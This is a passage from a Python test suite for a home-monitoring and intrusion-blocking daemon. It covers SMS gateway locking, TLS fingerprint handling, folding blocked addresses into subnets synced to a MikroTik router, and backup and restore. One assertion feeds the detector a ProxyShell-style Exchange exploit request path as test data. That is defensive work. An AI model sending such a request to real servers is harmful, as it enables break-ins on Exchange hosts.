        d._sms_send_lock.release()
finally:
    d._rest, d.sms_ready, d.sms_modem_id, d._sms_rest = _real
    for _k, _v in _was.items():
        if _v is None:
            _C.pop(_k, None)
        else:
            _C[_k] = _v
print('every question to the gateway holds the lock, and the lock re-enters')


# ---------------------------------------------------------------------------
# Reading TLS fingerprints must not cost the square of what is read
# ---------------------------------------------------------------------------
# A popular fingerprint - stock Chrome, a phone app - is worn by thousands of
# addresses in an hour. The list of them was rebuilt and walked for every line
# read, so the cost of a read grew with its length: twenty thousand lines, an
# ordinary busy hour on the proxy, took eighteen seconds, and every alert
# behind them waited that long to be acted on.
import random as _rnd

_MARK = 't13d1516h2_8daaf6152771_b186095e22b6'


def _tls_lines(n):
    out = []
    for _i in range(n):
        _ip = '%d.%d.%d.%d' % (_rnd.randint(1, 223), _rnd.randint(0, 255),
                               _rnd.randint(0, 255), _rnd.randint(1, 254))
        # nine in ten wearing the same one, as a real hour looks
        _m = _MARK if _i % 10 else 't13d%012x_%012x_%012x' % (
            _rnd.getrandbits(48), _rnd.getrandbits(48), _rnd.getrandbits(48))
        out.append(json.dumps({'event_type': 'tls', 'src_ip': _ip,
                               'tls': {'ja4': _m, 'sni': 'x.example'}}))
    return out


def _tls_run(n):
    d._tls_seen, d._tls_said = {}, {}
    d._tls_faces, d._tls_faced = {}, {}
    _at = _time.time()
    d.tls_weigh(_tls_lines(n))
    return _time.time() - _at


_small = _tls_run(2000)
_big = _tls_run(8000)
# what one fingerprint is allowed to remember, whatever arrives
_held = max((len(v) for v in d._tls_seen.values()), default=0)
assert _held <= 4000, \
    'one fingerprint is holding %d addresses; the list grows without end' % _held
# four times the lines must not cost anything like sixteen times the work
_grew = (_big / _small) if _small > 0.002 else 1.0
assert _grew < 10, \
    ('four times as many lines cost %.1f times as much - the work grows with the square '
     'of what is read, not with it' % _grew)
d._tls_seen, d._tls_said, d._tls_faces, d._tls_faced = {}, {}, {}, {}
print('reading TLS fingerprints costs what it reads, not the square of it')


# ---------------------------------------------------------------------------
# How the modem is doing is read on its own beat, and never from the inbox
# ---------------------------------------------------------------------------
# The status reading rode on the inbox's beat, so setting "Look for incoming
# messages" to never - which is right with the webhook on - stopped the card
# and every chart of the modem with it: "silent for 14h29m". And the status
# reading counted the inbox every ten minutes, so giving it back its beat
# would have brought back a read of the inbox nobody asked for: the one thing
# that wedges that box. Both are checked here on the real timer, with the
# house's own settings.
_C = zigmon.CONFIG
_was = {k: _C.get(k) for k in ('sms_enabled', 'sms_push', 'sms_poll_s', 'sms_api', 'sms_status_s')}
_C.update({'sms_enabled': 1, 'sms_push': 1, 'sms_poll_s': 0, 'sms_api': 'rest', 'sms_status_s': 1})
_asked = []
_real = (d._rest, d.sms_ready, d._sms_rest, d.sms_modem_id)


def _gateway(path, method='GET', payload=None, retry=True, timeout=None):
    _asked.append(path)
    if path == '/modems/status':
        return [{'id': '1-1', 'operator': 'T-Mobile CZ', 'rssi': -51, 'conntype': 'LTE'}]
    return []


d._rest, d.sms_ready, d._sms_rest, d.sms_modem_id = _gateway, (lambda: True), (lambda: True), (lambda: '1-1')
d._sms_sending = d._sms_sent_at = d._sms_status_at = 0
d._sms_status_busy = False
d._sms_counted_inbox_at = 0
d._stop.clear()
_timer = _th.Thread(target=d.timer_loop, daemon=True)
_timer.start()
_time.sleep(3.5)
d._stop.set()
_timer.join(5)
d._stop.clear()
d._rest, d.sms_ready, d._sms_rest, d.sms_modem_id = _real
for _k, _v in _was.items():
    if _v is None:
        _C.pop(_k, None)
    else:
        _C[_k] = _v
assert '/modems/status' in _asked, \
    'with the webhook on and looking set to never, the modem is never asked how it is doing'
assert _asked.count('/modems/status') >= 2, 'the modem was asked once and never again: %r' % (_asked,)
assert '/messages/status' not in _asked, \
    'the modem’s inbox was read with the webhook on, and nothing had asked for it: %r' % (_asked,)
print('the modem is asked how it is doing on its own beat, and its inbox is left alone')


# ---------------------------------------------------------------------------
# Folding addresses into the subnets their lists name whole
# ---------------------------------------------------------------------------
# The list fills with addresses from the same few streets, each a line of its
# own on the router. Where an enabled list names the whole street, one line
# for the street does the same work; where no list names it, the houses stay
# one line each, so nobody is kept out because a neighbour was. Every folded
# address keeps its reason and story, and taking the subnet off puts them back
# exactly as they were.
_C = zigmon.CONFIG
_was = {k: _C.get(k) for k in ('feeds', 'never_block', 'mikrotik_sync')}
_C.update({'feeds': 'foldlist,singles', 'mikrotik_sync': 0,
           'never_block': '192.168.0.0/16, 81.200.30.0/24'})
d.store.unblock()
d.store.put_feed('foldlist', [_r for _r in (zigmon.range_of('81.200.10.0/24'),
                                            zigmon.range_of('81.200.30.0/24')) if _r])
# a list of single addresses names no street at all
d.store.put_feed('singles', [_r for _r in (zigmon.range_of('81.200.20.5'),
                                           zigmon.range_of('81.200.20.9')) if _r])
_before = {}
for _ip, _why in (('81.200.10.3', 'on the foldlist list and knocked'),
                  ('81.200.10.44', 'on the foldlist list and knocked'),
                  ('81.200.10.200', 'on the foldlist list and knocked'),
                  # inside the listed street, but kept out for what it did
                  ('81.200.10.77', 'guessing at the secret of a one-tap link'),
                  # two single-address entries in one /24: no subnet for them
                  ('81.200.20.5', 'on the singles list and knocked'),
                  ('81.200.20.9', 'on the singles list and knocked'),
                  # a listed street that reaches the house's own
                  ('81.200.30.7', 'on the foldlist list and knocked'),
                  ('81.200.30.8', 'on the foldlist list and knocked')):
    d.store.block(_ip, None if _ip != '81.200.10.44' else time.time() + 3600, _why)
    _before[_ip] = dict(next(r for r in d.store.blocked_all() if r['ip'] == _ip))
_plan = d.fold_plan(24)
_nets = {g['net']: sorted(m['ip'] for m in g['members']) for g in _plan['groups']}
assert _nets == {'81.200.10.0/24': ['81.200.10.200', '81.200.10.3', '81.200.10.44', '81.200.10.77']}, \
    'the plan folded the wrong things: %r' % (_nets,)
assert _plan['before'] - _plan['after'] == 3, 'four lines into one should save three: %r' % (_plan,)
# nothing is done by asking
assert len(d.store.blocked_all()) == 8, 'the plan changed the list'
d.fold_apply(24, by='a test')
_rows = {r['ip']: r for r in d.store.blocked_all()}
assert '81.200.10.0/24' in _rows and '81.200.10.3' not in _rows, 'the street was not folded'
assert {'81.200.20.5', '81.200.20.9', '81.200.30.7', '81.200.30.8'} <= set(_rows), \
    'an address no list covers as a street was folded, or the house was reached'
for _ip in _before:
    assert d.store.blocked_until(_ip) is not None, '%s was let in by the folding' % _ip
# what it was kept out for is still there, under the subnet
_look = d.address_story('81.200.10.77')
assert _look['folded_into'] == '81.200.10.0/24', 'asking about a folded address does not say what keeps it out'
assert (_look['folded'] or {}).get('why') == 'guessing at the secret of a one-tap link', \
    'the reason it was kept out was lost: %r' % (_look['folded'],)
assert any(h['what'] == 'folded' for h in d.store.block_events(20, text='81.200.10.77')[0]), \
    'the story does not say it was folded'
assert d.store.blocked_before('81.200.10.77') == 1, 'folding counted as being kept out again'
_row = next(r for r in d.blocked_list() if r['ip'] == '81.200.10.0/24')
assert len(_row['members']) == 4 and _row['on_feeds'] == ['foldlist'], 'the subnet row lost its members'
# the router is told about the subnet, and the addresses come off it
_sent = []
_real = (d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on)
d.mikrotik_ready, d.blacklist_on = (lambda: True), (lambda: True)
d.mikrotik_entries = lambda remember=True: [
    {'address': ip, 'ours': True, 'comment': 'zigmon'} for ip in _before]
d.mikrotik_run = lambda command: _sent.append(command)
d.mikrotik_sync('a test')
d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on = _real
assert any('add' in c and 'address=81.200.10.0/24' in c for c in _sent), \
    'the subnet never reached the router: %r' % (_sent,)
for _ip in ('81.200.10.3', '81.200.10.44', '81.200.10.200', '81.200.10.77'):
    assert any('remove' in c and 'address=%s ' % _ip in c for c in _sent), \
        '%s stayed on the router after it was folded: %r' % (_ip, _sent)
assert any('81.200.10.0/24 is on' in c for c in _sent if 'add' in c), 'the router comment mangles the subnet'
# taking the subnet off is undoing the folding, not letting them in
d.unfold_net('81.200.10.0/24')
_rows = {r['ip']: r for r in d.store.blocked_all()}
assert '81.200.10.0/24' not in _rows, 'the subnet stayed'
for _ip in ('81.200.10.3', '81.200.10.44', '81.200.10.200', '81.200.10.77'):
    _got, _was_row = _rows.get(_ip), _before[_ip]
    assert _got, '%s did not come back' % _ip
    assert _got['why'] == _was_row['why'] and _got['until'] == _was_row['until'] \
        and abs(_got['since'] - _was_row['since']) < 1, '%s came back different' % _ip
d.store.unblock()
# ...and the same for IPv6: a list naming a whole /48 folds its addresses at
# /48 when asked for /16, at /64 by default, a list of single addresses folds
# nothing, and the router is told on its IPv6 side
d.store.put_feed('foldlist', [_r for _r in (zigmon.range_of('2a0e:97c0:aaaa::/48'),) if _r])
d.store.put_feed('singles', [_r for _r in (zigmon.range_of('2a0e:97c0:bbbb::5'),
                                           zigmon.range_of('2a0e:97c0:bbbb::9')) if _r])
for _ip in ('2a0e:97c0:aaaa:1::10', '2a0e:97c0:aaaa:1::20', '2a0e:97c0:aaaa:2::30',
            '2a0e:97c0:bbbb::5', '2a0e:97c0:bbbb::9'):
    d.store.block(_ip, None, 'on a list and knocked')
assert {g['net']: len(g['members']) for g in d.fold_plan(24)['groups']} == {'2a0e:97c0:aaaa:1::/64': 2}, \
    'IPv6 at the default width: %r' % (d.fold_plan(24)['groups'],)
assert {g['net']: len(g['members']) for g in d.fold_plan(16)['groups']} == {'2a0e:97c0:aaaa::/48': 3}, \
    'IPv6 at the widest: %r' % (d.fold_plan(16)['groups'],)
d.fold_apply(16)
assert d.store.blocked_until('2a0e:97c0:aaaa:ffff::1') is not None, 'the folded /48 keeps nothing out'
assert {'2a0e:97c0:bbbb::5', '2a0e:97c0:bbbb::9'} <= {r['ip'] for r in d.store.blocked_all()}, \
    'single IPv6 addresses were folded into a subnet no list names'
_sent = []
_real = (d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on)
d.mikrotik_ready, d.blacklist_on = (lambda: True), (lambda: True)
d.mikrotik_entries = lambda remember=True: []
d.mikrotik_run = lambda command: _sent.append(command)
d.mikrotik_sync('a test')
d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on = _real
assert any(c.startswith('/ipv6 ') and 'address=2a0e:97c0:aaaa::/48' in c for c in _sent), \
    'the IPv6 subnet did not reach the router\u2019s IPv6 list: %r' % (_sent,)
d.unfold_net('2a0e:97c0:aaaa::/48')
assert '2a0e:97c0:aaaa:2::30' in {r['ip'] for r in d.store.blocked_all()}, 'IPv6 did not unfold'
d.store.unblock()
d.store.put_feed('foldlist', [])
d.store.put_feed('singles', [])
for _k, _v in _was.items():
    if _v is None:
        _C.pop(_k, None)
    else:
        _C[_k] = _v
print('addresses fold into the subnets their lists name whole, keep their stories, reach the router, '
      'and unfold as they were')


# ---------------------------------------------------------------------------
# A fold is a job: here, then the router line by line, then the router read
# back - and every fold is kept, undoable on its own
# ---------------------------------------------------------------------------
import re as _re_f

_C = zigmon.CONFIG
_was = {k: _C.get(k) for k in ('feeds', 'never_block', 'mikrotik_sync', 'mikrotik_list',
                               'fold_versions_keep')}
_C.update({'feeds': 'foldlist', 'never_block': '192.168.0.0/16', 'mikrotik_sync': 1,
           'mikrotik_list': 'zigmon', 'fold_versions_keep': 3})
d.store.unblock()
d.store.put_feed('foldlist', [_r for _r in (zigmon.range_of('81.200.40.0/24'),
                                            zigmon.range_of('81.200.41.0/24')) if _r])


class _Router(object):
    """Holds its list; told to, loses an add - always, or only the first time."""
    def __init__(self):
        self.entries, self.lose, self.once = {}, set(), False

    def now(self, remember=True):
        return [{'address': a, 'ours': True, 'comment': 'zigmon:'} for a in self.entries]

    def run(self, command):
        add = _re_f.search(r'add list=\S+ address=(\S+)', command)
        if add:
            if add.group(1) in self.lose:
                if self.once:
                    self.lose.discard(add.group(1))
                return ''
            self.entries[d.same_address(add.group(1))] = 1
        rem = _re_f.search(r'remove \[find list=\S+ address=(\S+)', command)
        if rem:
            self.entries.pop(d.same_address(rem.group(1)), None)
        return ''


_box = _Router()
_real = (d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on)
d.mikrotik_ready, d.blacklist_on = (lambda: True), (lambda: True)
d.mikrotik_entries, d.mikrotik_run = _box.now, _box.run


def _finish(job):
    for _i in range(200):
        if job['done']:
            return job
        _time.sleep(0.05)
    raise AssertionError('the job never finished: %r' % (job,))


try:
    for _ip in ('81.200.40.1', '81.200.40.2', '81.200.40.3', '81.200.41.1', '81.200.41.2'):
        d.store.block(_ip, None, 'on a list and knocked')
    d.mikrotik_sync('start')
    _job = _finish(d.fold_job('fold', by='a test', widest=24))
    assert _job['ok'] and _job['check']['ok'], 'the fold did not end in step: %r' % (_job,)
    assert [s['state'] for s in _job['stages']] == ['done', 'done', 'done'], _job['stages']
    assert _job['sent'] == _job['total'] == 2 + 5, 'the progress did not count every line: %r' % (_job,)
    assert set(_box.entries) == {'81.200.40.0/24', '81.200.41.0/24'}, _box.entries
    _vid = _job['result']['version']
    # a scanner arriving after the fold, then the fold undone: the scanner
    # stays kept out, the fold's addresses come back as they were
    d.store.block('81.200.99.9', None, 'came later')
    _job = _finish(d.fold_job('undo', by='a test', version=_vid))
    assert _job['ok'], 'the undo did not end in step: %r' % (_job,)
    _rows = {r['ip'] for r in d.store.blocked_all()}
    assert _rows == {'81.200.40.1', '81.200.40.2', '81.200.40.3', '81.200.41.1', '81.200.41.2',
                     '81.200.99.9'}, 'the undo did not put the list back, or took the later one: %r' % (_rows,)
    assert set(_box.entries) == _rows, 'the router was not put back: %r' % (_box.entries,)
    assert d.store.fold_version(_vid)['undone'], 'the fold is not marked undone'
    try:
        d.fold_undo(_vid)
        raise AssertionError('a fold was undone twice')
    except ValueError:
        pass
    # a router that loses a line once is told again and ends in step; one
    # that keeps losing it is reported, with the line named
    _box.lose, _box.once = {'81.200.40.0/24'}, True
    _job = _finish(d.fold_job('fold', by='a test', widest=24))
    assert _job['ok'] and _job['check'].get('retried'), 'a line lost once was not put right: %r' % (_job['check'],)
    _job = _finish(d.fold_job('undo', by='a test', version=_job['result']['version']))
    _box.lose, _box.once = {'81.200.40.0/24'}, False
    _job = _finish(d.fold_job('fold', by='a test', widest=24))
    assert _job['ok'] is False and _job['check']['missing'] == ['81.200.40.0/24'], \
        'a router that will not take a line was not reported: %r' % (_job['check'],)
    assert _job['stages'][-1]['state'] == 'failed', _job['stages']
    # only the number of folds asked for is kept
    for _n in range(4):
        _j = _finish(d.fold_job('undo', by='a test', version=d.store.fold_versions(1)[0]['id']))
        _finish(d.fold_job('fold', by='a test', widest=24))
    d.store.prune_fold_versions(d.fold_keep())
    assert len(d.store.fold_versions()) == 3, 'kept %d folds, not 3' % len(d.store.fold_versions())
finally:
    d.mikrotik_ready, d.mikrotik_entries, d.mikrotik_run, d.blacklist_on = _real
    d.store.unblock()
    d.store.put_feed('foldlist', [])
    for _k, _v in _was.items():
        if _v is None:
            _C.pop(_k, None)
        else:
            _C[_k] = _v
print('a fold is told to the router line by line and read back; a lost line is told again, one that '
      'stays lost is named; any kept fold can be undone on its own')


# ---------------------------------------------------------------------------
# Two folds at once, a subnet that was only there for a while, the Exchange
# rule, and counting the rows without the lock
# ---------------------------------------------------------------------------
_C = zigmon.CONFIG
_was = {k: _C.get(k) for k in ('feeds', 'never_block', 'mikrotik_sync')}
_C.update({'feeds': 'foldlist', 'never_block': '192.168.0.0/16', 'mikrotik_sync': 0})
d.store.unblock()
d.store.put_feed('foldlist', [_r for _r in (zigmon.range_of('81.200.50.0/24'),
                                            zigmon.range_of('81.200.51.0/24'),
                                            zigmon.range_of('81.200.52.0/24')) if _r])
try:
    # a double click, or two tabs: every subnet must still know what it holds
    for _ip in ('81.200.50.1', '81.200.50.2', '81.200.51.1', '81.200.51.2'):
        d.store.block(_ip, None, 'on a list and knocked')
    _go = _th.Barrier(2)
    _ts = [_th.Thread(target=lambda: (_go.wait(), d.fold_apply(24, by='a tab'))) for _ in range(2)]
    for _t in _ts:
        _t.start()
    for _t in _ts:
        _t.join()
    for _net in ('81.200.50.0/24', '81.200.51.0/24'):
        assert len(d.fold_members(_net)) == 2, \
            'two folds at once left %s knowing %d of its 2 addresses' % (_net, len(d.fold_members(_net)))
    assert len([v for v in d.store.fold_versions() if not v['undone']
                and any(g['net'].startswith('81.200.5') for g in v['groups'])]) == 1, 'two folds were recorded'
    # a subnet on the list only for a while is made to last when addresses
    # are folded into it, and gets its own end back when that is undone
    d.store.unblock()
    _end = time.time() + 3600
    d.store.block('81.200.52.0/24', _end, 'put there by hand for an hour', auto=False)
    for _ip in ('81.200.52.1', '81.200.52.2'):
        d.store.block(_ip, None, 'on a list and knocked')
    _p = d.fold_apply(24, by='a test')
    assert d.store.blocked_until('81.200.52.0/24', networks=False) == 0, \
        'addresses were folded into a subnet that runs out'
    d.fold_undo(_p['version'])
    assert abs((d.store.blocked_until('81.200.52.0/24', networks=False) or 0) - _end) < 2, \
        'undone, the subnet did not get its own end back'
    assert {'81.200.52.1', '81.200.52.2'} <= {r['ip'] for r in d.store.blocked_all()}, 'the addresses did not come back'
    # one fold taken out of the undo history by hand: only the record goes -
    # the subnet stays kept out, still knows what it holds, and taking it off
    # still puts its addresses back. Not while a fold is running.
    d.store.unblock()
    for _ip in ('81.200.50.7', '81.200.50.8'):
        d.store.block(_ip, None, 'on a list and knocked')
    _p = d.fold_apply(24, by='a test')
    _vid = _p['version']
    _held = _th.Event()
    _let = _th.Event()

    def _hold():
        with d._fold_lock:
            _held.set()
            _let.wait(5)
    _t = _th.Thread(target=_hold)
    _t.start()
    _held.wait(5)
    _ok, _said = d.fold_forget(_vid, by='a test')
    _let.set()
    _t.join()
    assert not _ok and d.store.fold_version(_vid), 'a fold was taken out of the history while one was running'
    _ok, _said = d.fold_forget(_vid, by='a test')
    assert _ok and d.store.fold_version(_vid) is None, 'the fold is still in the history: %s' % _said
    assert d.store.blocked_until('81.200.50.0/24', networks=False) == 0, 'removing the record let the subnet go'
    assert len(d.fold_members('81.200.50.0/24')) == 2, 'removing the record lost what the subnet holds'
    assert d.fold_forget(_vid)[0] is False, 'a fold was taken out of the history twice'
    # one removed takes out that one only; "all" takes out the rest
    _ids = [d.store.add_fold_version('a test', 24, 1, 1, [], keep=50) for _ in range(3)]
    assert d.fold_forget(_ids[1])[0] and [v['id'] for v in d.store.fold_versions() if v['id'] in _ids] \
        == [_ids[2], _ids[0]], 'removing one fold took others with it'
    assert d.fold_forget('all')[0] and not d.store.fold_versions(), 'the whole history was not cleared'
    assert d.fold_forget('all')[0] is False, 'an empty history was cleared again'
    assert d.store.blocked_until('81.200.50.0/24', networks=False) == 0, 'clearing the history let the subnet go'
    d.unfold_net('81.200.50.0/24')
    assert {'81.200.50.7', '81.200.50.8'} <= {r['ip'] for r in d.store.blocked_all()}, \
        'with its record gone, taking the subnet off no longer puts its addresses back'
finally:
    d.store.unblock()
    d.store.put_feed('foldlist', [])
    for _k, _v in _was.items():
        if _v is None:
            _C.pop(_k, None)
        else:
            _C[_k] = _v
# an ordinary Outlook asking for its settings is not an attack; ProxyShell is
assert not zigmon.Daemon._known_way_in('/autodiscover/autodiscover.xml'), \
    'Outlook asking for its settings is taken for a break-in, and the owner’s phone would be kept out'
assert zigmon.Daemon._known_way_in('/autodiscover/autodiscover.json?@x.com/owa/?&Email=autodiscover/autodiscover.json%3F@x.com')
# the row counts for the header are read without the one lock everything
# writes through: two million rows took a fifth of a second to count, and
# every thirty seconds anything needing the lock waited for it
_takes = [0]
_real_lock = d.store.lock


class _Counting(object):
    def __enter__(self):
        _takes[0] += 1
        return _real_lock.__enter__()

    def __exit__(self, *a):
        return _real_lock.__exit__(*a)

    def acquire(self, *a, **k):
        _takes[0] += 1
        return _real_lock.acquire(*a, **k)

    def release(self):
        return _real_lock.release()


d.store.lock = _Counting()
d.store._stats_cache = None
_counts = d.store.stats()
d.store.lock = _real_lock
assert _takes[0] == 0, 'counting the rows took the database lock %d time(s)' % _takes[0]
assert 'samples' in _counts and 'events' in _counts, 'the counts are missing: %r' % (_counts,)
print('two folds at once cannot lose a subnet’s contents; a subnet that runs out is made to last '
      'and gets its end back; Outlook is not an attack; the counts are read without the lock')

# ---------------------------------------------------------------------------
# An SMS "home" covers the minutes before the Wi-Fi sees the phone - and no
# longer once the Wi-Fi has seen it
# ---------------------------------------------------------------------------
_PHONE = 'aa:bb:cc:dd:ee:77'
_was_people = d.store.get_meta('people')
d.store.set_meta('people', json.dumps([{'id': 'pz', 'name': 'Tester', 'macs': [_PHONE],
                                        'grace_s': 600, 'enabled': True}]))
_real_time = zigmon.time.time
_clock = [_real_time()]
zigmon.time.time = lambda: _clock[0]
try:
    _person = d.people()[0]

    def _round(on):
        _moved = d._settle_presence(_person, {_PHONE} if on else set(),
                                    {_PHONE: {'mac': _PHONE}} if on else {}, _clock[0])
        if _moved:
            d.presence['pz']['home'] = _moved == 'arrive'

    def _is_home():
        return bool((d.presence.get('pz') or {}).get('home'))

    _t0 = _clock[0]
    d.presence.pop('pz', None)
    _round(False)
    d.set_person_home('pz', 'home', 'sms: home')
    _clock[0] = _t0 + 300
    _round(False)
    assert _is_home(), 'an SMS "home" did not cover the minutes before the Wi-Fi sees the phone'
    _clock[0] = _t0 + 600
    _round(True)
    _clock[0] = _t0 + 900
    _round(False)                                   # out of the door
    _clock[0] = _t0 + 900 + 601
    _round(False)
    assert not _is_home(), ('seen on the Wi-Fi and then gone from it, somebody was still home because '
                            'of an SMS the Wi-Fi had already overtaken')
    # and one never followed by the Wi-Fi does not last for ever
    d.presence.pop('pz', None)
    _t0 = _clock[0] = _clock[0] + 86400
    _round(False)
    d.set_person_home('pz', 'home', 'sms: home')
    _clock[0] = _t0 + d.PHONE_TRUST_S + 60
    _round(False)
    assert not _is_home(), 'an SMS "home" never followed by the Wi-Fi held somebody home for ever'
finally:
    zigmon.time.time = _real_time
    d.store.set_meta('people', _was_people or '[]')
    d.presence.pop('pz', None)
print('an SMS "home" covers the walk from the car, and is spent the moment the Wi-Fi sees the phone')


# ---------------------------------------------------------------------------
# A server lost and rebuilt from its settings export: the list of addresses
# kept out and their history, the SMS commands, the Zigbee gateways, the names
# given by hand and what the configuration file said all have to come back
# ---------------------------------------------------------------------------
_was_mt = {k: zigmon.CONFIG.get(k) for k in ('mikrotik_host', 'mikrotik_list', 'mikrotik_sync')}
_told = []
_real_after = d.mikrotik_after_change
try:
    d.store.unblock()
    d.store.block('81.200.70.1', None, 'guessing at the secret of a one-tap link')
    d.store.set_meta('blocked_how_81.200.70.1', 'for good: it is on the foldlist list and it came here')
    d.store.block('81.200.70.2', time.time() + 3600, 'sweeping for .env files')
    d.store.unblock('81.200.70.2', how='taken off')
    d.store.block('81.200.70.3', time.time() + 3600, 'came back')
    d.save_sms_commands([{'phrase': 'lights off', 'target': '', 'do': 'on', 'reply': 'done'}])
    d.save_managed_gateways([{'name': 'Stick', 'host': '192.168.40.9', 'password': 'gw-secret'}])
    _x = d.export_settings(secrets=True)
    _plain = d.export_settings(secrets=False)
    assert not set(_plain.get('config_file') or {}) & {'db_file', 'log_file', 'token_file', 'api_port'}, \
        'where this machine keeps its files went into the export'
    assert not [k for k in (_plain.get('config_file') or {}) if d.SECRET_WORDS.search(k)], \
        'an export made without its secrets carries a password from the configuration file'
    # the house as it was on the old machine: a router in the file, a name
    # given by hand to a device this machine has never met
    _x['config_file'] = dict(_x.get('config_file') or {}, mikrotik_host='192.168.40.1',
                             mikrotik_list='zigmon-block', mikrotik_sync=1)
    _x['aliases'] = {'0xrebuilt': 'Hall sensor'}
    # the server is gone
    d.store.unblock()
    d.store.db.execute('DELETE FROM block_events WHERE ip LIKE ?', ('81.200.70.%',))
    d.store.db.execute('DELETE FROM blocked_log WHERE ip LIKE ?', ('81.200.70.%',))
    d.store.db.commit()
    d.store.set_meta('blocked_how_81.200.70.1', '')
    d.store.db.execute("DELETE FROM meta WHERE key='blocked_how_81.200.70.1'")
    d.store._meta_raw.pop('blocked_how_81.200.70.1', None)
    d.save_sms_commands([])
    d.store.set_meta('gateways', '[]')
    for _k in ('mikrotik_host', 'mikrotik_list', 'mikrotik_sync'):
        zigmon.CONFIG[_k] = zigmon.DEFAULTS[_k]
    d.mikrotik_after_change = lambda: _told.append(1)
    _said = d.import_settings(_x)
    _ips = {r['ip'] for r in d.store.blocked_all()}
    assert {'81.200.70.1', '81.200.70.3'} <= _ips, 'the addresses kept out did not come back: %r' % (_ips,)
    assert '81.200.70.2' not in _ips, 'an address let back in before the export came back kept out'
    assert d.store.get_meta('blocked_how_81.200.70.1'), 'what was said about an address did not come back'
    assert len([e for e in d.store.block_events(50, text='81.200.70')[0]]) >= 4, 'the history did not come back'
    assert d.store.blocked_before('81.200.70.2') >= 1, 'the history of an address let back in did not come back'
    assert [c['phrase'] for c in d.sms_commands()] == ['lights off'], 'the SMS commands did not come back'
    assert [g['name'] for g in d.managed_gateways()] == ['Stick'] \
        and d.managed_gateways()[0]['password'] == 'gw-secret', 'the Zigbee gateways did not come back'
    assert d.mikrotik_ready() and zigmon.CONFIG.get('mikrotik_list') == 'zigmon-block', \
        'the router kept in the configuration file did not come back'
    assert _told, 'the router was not told about the list that came back'
    d.store.upsert_device({'id': '0xrebuilt', 'name': '0xrebuilt', 'source': 'zigbee'})
    assert (d.store.device('0xrebuilt') or {}).get('alias') == 'Hall sensor', \
        'a name given by hand was lost because the device had not turned up yet'
    # the same file twice writes nothing twice
    _n = len(d.store.block_events(500)[0])
    d.import_settings(_x)
    assert len(d.store.block_events(500)[0]) == _n, 'importing the same file twice doubled the history'
finally:
    d.mikrotik_after_change = _real_after
    for _k, _v in _was_mt.items():
        zigmon.CONFIG[_k] = _v
    d.store.unblock()
    d.save_sms_commands([])
    d.store.set_meta('gateways', '[]')
print('a server rebuilt from its export gets back its list of addresses kept out with their history, '
      'its SMS commands, gateways, router and hand-given names')


# ---------------------------------------------------------------------------
# The whole database put back from a backup: its settings are in force at
# once (not after a restart), a setting only this machine had goes back to
# the default, and the router is told about the list that came back
# ---------------------------------------------------------------------------
_was_ov = d.store.get_meta('config_overrides') or '{}'
_was_cfg = {k: zigmon.CONFIG.get(k) for k in ('sms_credit_code', 'sms_credit_every_h')}
_told = []
_real_after = d.mikrotik_after_change
_made = []
try:
    d.save_config_overrides({'sms_credit_code': '*777#', 'pin': zigmon.CONFIG.get('pin')})
    d.store.block('81.200.80.1', None, 'kept out when the backup was made')
    _b = d.db_backup_now('-guard')
    _made.append(_b['file'])
    d.save_config_overrides({'sms_credit_code': '*101#', 'sms_credit_every_h': 5,
                             'pin': zigmon.CONFIG.get('pin')})
    d.store.unblock('81.200.80.1')
    d.mikrotik_after_change = lambda: _told.append(1)
    _r = d.db_restore(_b['file'])
    _made.append(_r['previous_saved_as'])
    assert zigmon.CONFIG.get('sms_credit_code') == '*777#', \
        'the restored settings were not in force until a restart: %r' % zigmon.CONFIG.get('sms_credit_code')
    assert zigmon.CONFIG.get('sms_credit_every_h') == zigmon.DEFAULTS['sms_credit_every_h'], \
        'a setting the backup did not have stayed as this machine had it'
    assert d.store.blocked_until('81.200.80.1') is not None, 'the list did not come back with the database'
    assert _told, 'the router was not told about the list that came back with the database'
finally:
    d.mikrotik_after_change = _real_after
    d.store.set_meta('config_overrides', _was_ov)
    for _k, _v in _was_cfg.items():
        zigmon.CONFIG[_k] = _v
    d.store.unblock('81.200.80.1')
    for _f in _made:
        try:
            d.db_backup_path(_f).unlink()
        except Exception:
            pass
print('a database put back from a backup has its settings in force at once and tells the router')


# ---------------------------------------------------------------------------
# Imports on trial: only new things, never a change to what is in force;
# on trial nothing acts; a newer trial may replace an older one and rolling
# it back puts the older one back; commit makes it real; the history is
# cleared one by one or all at once, never while something is still on trial
# ---------------------------------------------------------------------------
_real_fire, _real_send, _real_reply, _real_allowed = d._fire_target, d.send_message, d.sms_reply, d.sms_allowed
_was_lists = {k: d.store.get_meta(m) for k, m, _g, _s, _c in d.TRIAL_SECTIONS}
_was_trials = d.store.get_meta('trial_imports')
_fired, _sent, _replies = [], [], []
try:
    d._fire_target = lambda target, do, origin, *a, **k: _fired.append((target, do))
    d.send_message = lambda mid, origin, facts=None, way='': _sent.append(mid)
    d.sms_reply = lambda number, text: _replies.append(text)
    d.save_alert_messages([{'id': 'm-live', 'name': 'Live alert', 'text': 'live', 'level': 'info'}])
    d.save_sms_commands([{'id': 's-live', 'phrase': 'lights off', 'reply': 'ok'}])
    _live = {k: json.dumps(getattr(d, g)()) for k, _m, g, _s, _c in d.TRIAL_SECTIONS}

    def _untouched():
        for _k, _m, _g, _s, _c in d.TRIAL_SECTIONS:
            _now = [x for x in getattr(d, _g)() if not d.trial_of(_k, x.get('id'))]
            assert json.dumps(_now) == _live[_k], 'an import on trial changed %s in force' % _k

    _f1 = {'messages': [{'id': 'm-hot', 'name': 'Too hot', 'text': 'It is {value}', 'level': 'warn'}],
           'rules': [{'id': 'r-hot', 'device': 'dev-trial', 'key': 'temperature', 'op': '>', 'value': 30,
                      'plug': 'notify:m-hot', 'do': 'on'}],
           'sms_commands': [{'id': 's-hot', 'phrase': 'how hot', 'reply': 'warm'}]}
    _b1 = d.trial_add(_f1, by='a test', name='hot.json')
    _untouched()
    d.fire_rules('dev-trial', 'dev-trial', {'temperature': 35})
    assert not _fired and not _sent, 'a rule on trial acted: %r %r' % (_fired, _sent)
    assert d.trial_imports()[0]['would_n'] == 1, 'what a rule on trial would have done was not written down'
    d.sms_allowed = lambda n: True
    d.sms_handle('+420777000999', 'how hot')
    assert not _fired and _replies and _replies[-1].startswith('[TEST]'), \
        'an SMS command on trial acted, or did not say it was a test: %r' % (_replies,)
    d.sms_allowed = lambda n: False
    _n = len(_replies)
